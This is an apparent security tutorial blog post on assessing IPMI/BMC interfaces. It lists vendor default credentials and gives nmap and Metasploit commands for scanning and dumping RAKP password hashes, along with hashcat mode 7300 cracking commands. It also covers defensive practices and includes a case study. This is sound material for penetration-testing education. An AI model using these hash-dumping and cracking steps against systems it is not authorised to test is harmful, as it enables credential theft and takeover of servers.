---
title: IPMI
published: 2025-04-20
description: "A simplified guide to IPMI in cybersecurity."
# image: "../../assets/images/my_photo.jpg"
tags: ["Cyber"]
category: Footprinting
draft: false
---

## Intelligent Platform Management Interface (IPMI) Security Assessment

### Introduction to IPMI
Intelligent Platform Management Interface (IPMI) is a hardware-based management system that operates independently of:
- Host BIOS
- CPU
- Firmware
- Operating System

**Key Capabilities:**
- Remote system management (even when powered off)
- Hardware monitoring (temperature, voltage, fan status)
- Inventory management
- Alerting via SNMP
- Serial over LAN access (IPMI 2.0+)

## IPMI Components

| Component | Function |
|-----------|----------|
| Baseboard Management Controller (BMC) | Embedded microcontroller running Linux |
| Intelligent Chassis Management Bus (ICMB) | Enables chassis-to-chassis communication |
| Intelligent Platform Management Bus (IPMB) | Extends BMC capabilities |
| IPMI Memory | Stores system event logs and repository data |
| Communication Interfaces | Provides network and local access |

### Common BMC Implementations
- **HP**: Integrated Lights-Out (iLO)
- **Dell**: Dell Remote Access Controller (DRAC)
- **Supermicro**: IPMI
- **Cisco**: CIMC

### IPMI Footprinting Techniques

### 1. Nmap Scanning
```bash
sudo nmap -sU --script ipmi-version -p 623 <target_IP>
```

**Common Ports:**

- 623/UDP - Primary IPMI communication
- 80/443/TCP - Web interface
- 22/TCP - SSH
- 23/TCP - Telnet

### 2. Metasploit Module

```bash
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <target_IP>
run
```

## Default Credentials

| Vendor | Username | Password |
| --- | --- | --- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | Random 8-char (numbers+uppercase) |
| Supermicro IPMI | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD |
| Fujitsu iRMC | admin | admin |

## IPMI Security Vulnerabilities

### 1. RAKP Protocol Flaw (CVE-2013-4786)

- IPMI 2.0 sends salted SHA1/MD5 hashes during authentication
- Allows offline cracking of password hashes
- No direct fix available (protocol-level issue)

### 2. Common Attack Vectors

- Default credential access
- Hash extraction and cracking
- Password reuse across systems
- Unauthenticated information disclosure

### Exploitation Techniques

### 1. Hash Extraction with Metasploit

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target_IP>
run
```

### 2. Hash Cracking with Hashcat

```bash
hashcat -m 7300 ipmi_hashes.txt wordlist.txt
```

**Mode 7300**: IPMI RAKP HMAC-SHA1

### 3. HP iLO Default Password Pattern

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

## Post-Exploitation Impact

Successful BMC compromise can lead to:

- Complete system control (power on/off)
- OS reinstallation
- BIOS modification
- Hardware monitoring manipulation
- Credential theft via virtual media mounting

## Security Best Practices

### For Administrators:

1. **Change default credentials** immediately
2. **Network segmentation** for BMC interfaces
3. **Disable IPMI** if not required
4. **Use dedicated management networks**
5. **Implement complex passwords** (15+ chars)
6. **Disable anonymous authentication**
7. **Regular firmware updates**

### For Penetration Testers:

1. **Always check for IPMI services** (port 623/UDP)
2. **Test default credentials** thoroughly
3. **Attempt hash extraction** when credentials fail
4. **Check for password reuse** across systems
5. **Document findings** including hash samples
6. **Verify web console access** if available

## Detection and Prevention

### Detection Methods:

- Network scans for port 623/UDP
- Monitor for brute force attempts
- Review BMC access logs

### Prevention Strategies:

- Implement account lockout policies
- Enable two-factor authentication (when available)
- Restrict IPMI access to management stations
- Use VPN for remote management access

### Case Study Example

During an internal penetration test:

1. Discovered IPMI service on multiple servers
2. Extracted hashes using Metasploit
3. Cracked ADMIN hash (Password: Server@123)
4. Found same credentials used for:
    - Domain admin accounts
    - Network device logins
    - Critical application backends
5. Achieved full domain compromise

### Conclusion

IPMI provides powerful remote management capabilities but introduces significant security risks when improperly configured. Penetration testers should prioritize IPMI assessment during internal engagements, as compromised BMC access often leads to complete network compromise. Organizations must balance management convenience with security by implementing strict access controls and monitoring for this powerful management interface.